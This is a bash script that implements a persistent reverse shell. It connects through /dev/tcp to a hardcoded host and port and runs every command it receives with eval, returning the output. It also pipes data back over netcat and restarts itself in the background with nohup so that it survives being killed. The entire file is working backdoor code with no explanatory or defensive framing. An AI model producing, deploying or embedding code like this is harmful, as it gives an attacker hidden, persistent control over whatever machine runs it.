#!/bin/bash

H="192.168.2.104"
randomPort=4443
P=$randomPort

start_background_script() {
    while true; do
        currentPrompt="SHELL> "
        # Establish connection
        exec 3<>/dev/tcp/$H/$P || { echo "Error: Could not connect to $H on port $P"; exit 1; }

        # Send initial message
        echo "[*] Connection Established!" >&3

        while IFS= read -r data <&3; do
            if [[ "$data" == "quit" ]]; then
                echo "[*] Connection closed!" >&3
                exec 3>&-
                exec 3<&-
                exit 0
            fi

            if [[ "$data" == "send_data" ]]; then
                echo "[*] Sending data..."
                dd if=/dev/zero bs=1024 count=1024 | nc -q 0 $H $P
                echo "[*] Data Sent!" >&3
                continue
            fi

            if [[ "$data" == cd* ]]; then
                directoryPath="${data:3}"
                cd "$directoryPath" || echo "Error: Could not change directory to $directoryPath"
                continue
            fi

            # Execute command
            output=$(eval "$data" 2>&1)
            echo "$output" >&3
            echo "$currentPrompt" >&3
        done <&3

        exec 3>&-
        exec 3<&-
    done
}

# Function to monitor and restart the background script
monitor_script() {
    while true; do
        # Check if the background script is running
        if ! pgrep -f "$0 start_background_script" > /dev/null; then
            echo "[*] Background script not running, starting..."
            nohup bash -c "$0 start_background_script" &
        fi
        sleep 5
    done
}

# Main script logic
if [[ "$1" == "start_background_script" ]]; then
    start_background_script
else
    monitor_script
fi
